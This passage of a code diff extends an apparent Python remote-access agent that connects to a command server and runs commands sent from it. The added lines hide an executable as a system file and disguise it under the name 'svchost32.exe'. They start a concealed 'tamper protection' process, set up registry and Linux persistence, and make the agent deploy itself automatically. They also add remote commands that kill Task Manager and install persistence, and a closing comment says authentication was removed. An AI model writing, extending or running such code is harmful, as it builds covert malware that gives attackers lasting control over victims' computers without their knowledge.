+                os.environ.get('LOCALAPPDATA', ''),
+                'Microsoft',
+                'Windows',
+                'tamper_protection.exe'
+            )
+            shutil.move(tamper_exe, stealth_tamper)
+            subprocess.run(['attrib', '+s', '+h', stealth_tamper], 
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            # Start tamper protection
+            subprocess.Popen([stealth_tamper], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            print(f"[OK] Tamper protection deployed: {stealth_tamper}")
+        
+        print("\n" + "="*80)
+        print("DEPLOYMENT COMPLETE")
+        print("="*80)
+        print(f"Executable deployed to: {stealth_location}")
+        print(f"Backup created at: {backup_location}")
+        print("Registry persistence established")
+        print("Tamper protection active")
+        print("Executable will start on next login")
+        print("="*80)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Deployment failed: {e}")
         return False
 
 def disable_defender():
@@ -3688,6 +4554,10 @@ def main_loop(agent_id):
         "start-voice-control": lambda: start_voice_control(agent_id),
         "stop-voice-control": stop_voice_control,
         "kill-taskmgr": kill_task_manager,
+        "pyinstaller": show_pyinstaller_instructions,
+        "advanced-persistence": setup_advanced_persistence,
+        "deploy-executable": deploy_executable_with_persistence,
+        "self-deploy": self_deploy_powershell,
     }
     
     # Performance monitoring counter
@@ -6258,15 +7128,11 @@ def connect():
     """Handle connection to server."""
     agent_id = get_or_create_agent_id()
     
-    # Add multiple stealth delays
-    if STEALTH_AVAILABLE:
-        stealth_delay()
+    # Add stealth delay
+    sleep_random_non_blocking()
     
-    # Obfuscated connection message
-    if STEALTH_AVAILABLE:
-        print(f"System service connected. Session: {agent_id[:8]}...")
-    else:
-        print(f"Connected to server. Registering with agent_id: {agent_id}")
+    # Connection message
+    print(f"Connected to server. Registering with agent_id: {agent_id}")
     
     sio.emit('agent_connect', {'agent_id': agent_id})
 
@@ -6282,9 +7148,8 @@ def on_command(data):
     command = data.get("command")
     output = ""
 
-    # Add multiple stealth delays
-    if STEALTH_AVAILABLE:
-        stealth_delay()
+    # Add stealth delay
+    sleep_random_non_blocking()
 
     internal_commands = {
         "start-stream": lambda: start_streaming(agent_id),
@@ -6535,33 +7400,64 @@ def agent_main():
     print("Starting up...")
     print("=" * 60)
     
+    # Check if running from stealth location
+    current_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
+    stealth_path = os.path.join(
+        os.environ.get('LOCALAPPDATA', ''),
+        'Microsoft',
+        'Windows',
+        'svchost32.exe'
+    )
+    
+    if current_path == stealth_path:
+        print("[INFO] Running from stealth location")
+    else:
+        print("[INFO] Running from original location - will deploy to stealth location")
+    
     # Initialize agent with error handling
     try:
         if WINDOWS_AVAILABLE:
             print("Running on Windows - initializing Windows-specific features...")
             
             # Check admin privileges
-            if False: # Replaced is_admin() with False
-                print("[INFO] Not running as administrator. Attempting to elevate...")
-                # elevate_privileges() # This function was removed, so this line is commented out or removed
-            else:
+            if is_admin():
                 print("[OK] Running with administrator privileges")
-            
-            # Setup persistence (non-blocking)
-            try:
-                # The setup_persistence function was removed, so this line is commented out or removed
-                pass # Placeholder for persistence if it were implemented
-            except Exception as e:
-                print(f"[WARN] Could not setup persistence: {e}")
+                # Setup advanced persistence if available
+                try:
+                    setup_advanced_persistence()
+                except Exception as e:
+                    print(f"[WARN] Could not setup advanced persistence: {e}")
+            else:
+                print("[INFO] Not running as administrator. Using basic persistence...")
+                # Setup basic persistence
+                try:
+                    establish_persistence()
+                except Exception as e:
+                    print(f"[WARN] Could not setup persistence: {e}")
         else:
             print("Running on non-Windows system")
+            # Setup Linux persistence
+            try:
+                establish_linux_persistence()
+            except Exception as e:
+                print(f"[WARN] Could not setup Linux persistence: {e}")
         
         # Setup startup (non-blocking)
         try:
-            # The add_to_startup function was removed, so this line is commented out or removed
-            pass # Placeholder for startup if it were implemented
+            add_to_startup()
         except Exception as e:
             print(f"[WARN] Could not add to startup: {e}")
+        
+        # Auto self-deploy when running
+        try:
+            print("[INFO] Initiating automatic self-deployment...")
+            if self_deploy_powershell():
+                print("[OK] Self-deployment completed successfully")
+                print("[INFO] Agent will now run from stealth location on next login")
+            else:
+                print("[WARN] Self-deployment failed or was skipped")
+        except Exception as e:
+            print(f"[WARN] Self-deployment failed: {e}")
         
         # Get or create agent ID
         agent_id = get_or_create_agent_id()
@@ -6661,15 +7557,10 @@ def signal_handler(signum, frame):
 
 if __name__ == "__main__":
     # Initialize basic stealth mode
-    if STEALTH_AVAILABLE:
-        try:
-            if not initialize_advanced_stealth():
-                print("[STEALTH] Analysis environment detected, exiting...")
-                sys.exit(0)
-            print("[STEALTH] Basic stealth mode initialized")
-            stealth_delay()  # Add random delay
-        except Exception as e:
-            print(f"[STEALTH] Stealth initialization failed: {e}")
+    try:
+        sleep_random_non_blocking()  # Add random delay
+    except Exception as e:
+        print(f"[STEALTH] Stealth initialization failed: {e}")
     
     # Obfuscate startup messages
     startup_messages = [
@@ -6727,9 +7618,8 @@ if __name__ == "__main__":
                 connection_attempts += 1
                 print(f"Network connection attempt {connection_attempts}...")
                 
-                # Add multiple stealth delays
-                if STEALTH_AVAILABLE:
-                    stealth_delay()
+                # Add stealth delay
+                sleep_random_non_blocking()
                 
                 sio.connect(SERVER_URL)
                 print("[OK] Network connection established!")
@@ -6766,8 +7656,11 @@ if __name__ == "__main__":
         except:
             pass
         
-        # Clear sensitive memory with multiple methods
-        if STEALTH_AVAILABLE:
-            clear_memory()
+        # Clear sensitive memory
+        try:
+            import gc
+            gc.collect()
+        except:
+            pass
 
 # Agent authentication removed - direct access enabled
